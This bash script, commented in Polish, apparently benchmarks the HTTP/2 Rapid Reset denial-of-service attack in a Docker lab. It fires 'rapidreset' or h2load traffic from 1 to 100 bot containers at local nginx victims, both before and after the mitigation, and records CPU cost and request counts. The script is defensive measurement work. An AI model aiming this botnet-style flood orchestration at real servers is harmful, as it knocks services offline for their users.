#!/usr/bin/env bash
# =============================================================================
# Matryca 3D: TYP RUCHU x WARIANT SERWERA x ROZMIAR BOTNETU
#
#   typ ruchu:     attack (rapidreset: HEADERS+RST_STREAM) | legit (h2load: kompletne zadania)
#   wariant:       old_normal | old_hardened | new_normal | new_hardened
#                  (old = nginx 1.25.1, sprzed mitygacji 1.25.3; new = nginx 1.27)
#   rozmiar:       1 5 10 25 50 100 (konfigurowalne przez SIZES)
#
# Dla kazdej kombinacji mierzy (wszystko sampled przez `docker stats`, jeden
# call/sekunda zwraca ofiara + aktywna podgrupa botow naraz - bez zbednych
# dodatkowych wywolan docker exec):
#   - CPU% ofiary (lab-victim)
#   - SUMA CPU% botow aktywnie generujacych ruch w tym kroku (koszt atakujacego)
#   - delta polaczen/zadan z nginx stub_status
#
# Flota botfleet jest podnoszona RAZ do max(SIZES) i trzymana przez cala
# matryce; kazdy krok uzywa tylko pierwszych N kontenerow z tej (stabilnej)
# listy ID. Victim jest przebudowywany/restartowany miedzy wariantami
# (docker-compose.labvic.yml, zmienne NGINX_OLD / VICTIM_MODE).
#
# Wyjscie: $OUTDIR/raw.csv (long format, 1 wiersz = 1 powtorzenie),
#          $OUTDIR/timeline.txt (log przebiegu)
#
# Parametry (zmienne srodowiskowe):
#   SIZES="1 5 10 25 50 100"
#   MODES="attack legit"
#   REPS=2            powtorzenia kazdej komorki matrycy
#   REQ=2000 CONC=100  parametry per-bot na jedno uderzenie (STALE w calej matrycy,
#                      zmienna jest tylko N - tak, by izolowac efekt rozmiaru botnetu)
#   WARM=3 WIN=4 NWIN=2 GAP=3   okna pomiarowe (sekundy)
#   BOT_CPUS=0.5 VIC_CPUS=2     limity CPU (VIC_CPUS musi sie zgadzac z
#                               worker_processes w victim/nginx*.conf!)
#
# IZOLACJA RDZENI: victim jest przypiety do rdzeni 0,1, flota do 2-11
# (docker-compose.labvic.yml / docker-compose.botnet.yml, cpuset). Dzieki
# temu BOT_CPUS x max(SIZES) moze bezpiecznie przekraczac liczbe rdzeni
# dostepnych flocie (kontenery floty beda sie throttlowac MIEDZY SOBA, co
# jest OK i realistyczne - ale NIGDY nie odbiora CPU ofierze). Mimo to, dla
# czytelnych wynikow, trzymaj BOT_CPUS x max(SIZES) w okolicy liczby rdzeni
# przypisanych flocie (np. 10 rdzeni -> BOT_CPUS=0.1 dla SIZES do 100).
#
# Wymaga: docker compose up -d --build (bazowy lab) NIE jest wymagane z wyprzedzeniem -
# skrypt sam buduje/startuje wszystko, co potrzebuje.
# =============================================================================
set -u
export MSYS_NO_PATHCONV=1 2>/dev/null || true
export MSYS2_ARG_CONV_EXCL='*' 2>/dev/null || true

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$ROOT"

SIZES="${SIZES:-1 5 10 25 50 100}"
MODES="${MODES:-attack legit}"
REPS="${REPS:-2}"
REQ="${REQ:-2000}"
CONC="${CONC:-100}"
WARM="${WARM:-3}"; WIN="${WIN:-4}"; NWIN="${NWIN:-2}"; GAP="${GAP:-3}"
BOT_CPUS="${BOT_CPUS:-0.5}"
VIC_CPUS="${VIC_CPUS:-2}"

NMAX=0; for s in $SIZES; do [ "$s" -gt "$NMAX" ] && NMAX=$s; done
DUR=$((WARM + WIN*NWIN + 2))

OUTDIR="${OUTDIR:-$ROOT/lab-results/matrix3d}"
mkdir -p "$OUTDIR"
CSV="$OUTDIR/raw.csv"
TL="$OUTDIR/timeline.txt"

BASE_FILES=(-f docker-compose.yml -f docker-compose.override.yml -f docker-compose.labvic.yml -f docker-compose.botnet.yml)
dc() { docker compose "${BASE_FILES[@]}" "$@"; }

log() { echo "$(date '+%H:%M:%S') | $*" | tee -a "$TL"; }

echo "metric_scenario,mode,variant,ver,hard,size,rep,cpu_victim_pct,cpu_bots_sum_pct,active_conns,ngx_req_delta,ngx_accept_delta" > "$CSV"

# --- 0. Flota: podnies RAZ do NMAX, zapamietaj stabilna liste ID ---
log "=== SETUP: baza + flota botfleet=$NMAX (BOT_CPUS=$BOT_CPUS) ==="
BOT_CPUS="$BOT_CPUS" dc up -d --build --scale "botfleet=$NMAX"
sleep 2
ALL_BOT_IDS=($(dc ps -q botfleet))
ACTUAL_N=${#ALL_BOT_IDS[@]}
log "flota gotowa: $ACTUAL_N botow (zadano $NMAX)"
if [ "$ACTUAL_N" -lt "$NMAX" ]; then
  log "UWAGA: dostalem mniej botow niz zadano - sprawdz limity Dockera/hosta"
fi

# --- helpers ---
stub_pair() { # zwraca "active req accept" z stub_status (0 0 0 na bledzie)
  local out
  out="$(dc exec -T loadgen curl -sk --max-time 3 https://victim/status 2>/dev/null)"
  local act req acc
  act="$(echo "$out" | awk '/Active/{print $3}')"
  req="$(echo "$out" | awk 'NR==3{print $3}')"
  acc="$(echo "$out" | awk 'NR==3{print $2}')"
  echo "${act:-0} ${req:-0} ${acc:-0}"
}

wait_victim() {
  local i=0
  while [ $i -lt 40 ]; do
    dc exec -T loadgen curl -sk --max-time 2 https://victim/ -o /dev/null 2>/dev/null && return 0
    i=$((i+1)); sleep 1
  done
  return 1
}

# docker stats dla victim + konkretnej podgrupy botow, jedno probkowanie
sample_once() { # $@ = lista ID botow do zsumowania
  local ids=("lab-victim" "$@")
  docker stats --no-stream --format '{{.Name}}\t{{.CPUPerc}}' "${ids[@]}" 2>/dev/null
}

run_window() { # $1=duration(s) $2...=bot ids aktywne w tym kroku; echo "cpu_victim cpu_bots_sum"
  local dur="$1"; shift
  local vsum=0 bsum=0 n=0 t_end=$(( $(date +%s) + dur ))
  while [ "$(date +%s)" -lt "$t_end" ]; do
    local raw; raw="$(sample_once "$@")"
    local v b
    v="$(echo "$raw" | awk -F'\t' '$1=="lab-victim"{gsub("%","",$2); print $2}')"
    b="$(echo "$raw" | awk -F'\t' '$1!="lab-victim"{gsub("%","",$2); s+=$2} END{print s+0}')"
    [ -n "$v" ] && { vsum=$(awk "BEGIN{print $vsum+$v}"); bsum=$(awk "BEGIN{print $bsum+$b}"); n=$((n+1)); }
    sleep 1
  done
  if [ "$n" -gt 0 ]; then
    awk "BEGIN{printf \"%.2f %.2f\", $vsum/$n, $bsum/$n}"
  else
    echo "0 0"
  fi
}

fire_and_stop() { # $1=mode $2=duration $3...=bot ids
  local mode="$1" dur="$2"; shift 2
  local single
  if [ "$mode" = "attack" ]; then
    single="rapidreset -url https://victim:443 -requests $REQ -concurrency $CONC -quiet >/dev/null 2>&1"
  else
    single="h2load -n $REQ -c $CONC https://victim/ >/dev/null 2>&1"
  fi
  local cid
  for cid in "$@"; do
    docker exec -d "$cid" sh -c \
      "end=\$(( \$(date +%s) + $dur + 2 )); while [ \$(date +%s) -lt \$end ]; do $single; done" 2>/dev/null &
  done
  wait
}

stop_bots() {
  local cid
  for cid in "$@"; do
    docker exec "$cid" sh -c 'pkill rapidreset 2>/dev/null; pkill h2load 2>/dev/null; exit 0' 2>/dev/null &
  done
  wait
}

run_variant() { # $1=label $2=ver(nginx tag) $3=mode-hardening(normal|hardened)
  local label="$1" ver="$2" hard="$3"
  log "=== WARIANT $label (nginx=$ver, mode=$hard) ==="
  NGINX_OLD="$ver" VICTIM_MODE="$hard" VIC_CPUS="$VIC_CPUS" dc build victim >/dev/null 2>&1
  NGINX_OLD="$ver" VICTIM_MODE="$hard" VIC_CPUS="$VIC_CPUS" dc up -d --force-recreate victim >/dev/null 2>&1
  if ! wait_victim; then
    log "BLAD: victim nie wstal dla $label - pomijam"
    return
  fi

  local mode size rep
  for mode in $MODES; do
    for size in $SIZES; do
      local ids=("${ALL_BOT_IDS[@]:0:$size}")
      for rep in $(seq 1 "$REPS"); do
        read -r a0 r0 c0 <<< "$(stub_pair)"
        fire_and_stop "$mode" "$DUR" "${ids[@]}" &
        local FIRE_PID=$!
        sleep "$WARM"
        read -r cpu_v cpu_b <<< "$(run_window $((WIN*NWIN)) "${ids[@]}")"
        read -r a1 r1 c1 <<< "$(stub_pair)"
        wait "$FIRE_PID" 2>/dev/null
        stop_bots "${ids[@]}"

        local rdelta=$((r1 - r0)); local adelta=$((c1 - c0))
        echo "$label,$mode,$label,$ver,$hard,$size,$rep,$cpu_v,$cpu_b,$a1,$rdelta,$adelta" >> "$CSV"
        log "  mode=$mode size=$size rep=$rep -> cpu_victim=${cpu_v}% cpu_bots=${cpu_b}% active=${a1} req_delta=$rdelta"
        sleep "$GAP"
      done
    done
  done
}

# --- Baseline (bez ruchu, dla punktu odniesienia) - po jednym per wariant pozniej jest w CSV jako size odrebny wpis nie jest potrzebny; pomijamy, bo 'size' najmniejsze (1) juz daje odniesienie ---

run_variant old_normal   1.25.1-alpine normal
run_variant old_hardened 1.25.1-alpine hardened
run_variant new_normal   1.27-alpine   normal
run_variant new_hardened 1.27-alpine   hardened

log "=== MATRYCA GOTOWA -> $CSV ==="
echo
echo "Wierszy w CSV: $(($(wc -l < "$CSV") - 1))"
echo "Dalej: python scenarios/make_charts.py $CSV $OUTDIR/charts"
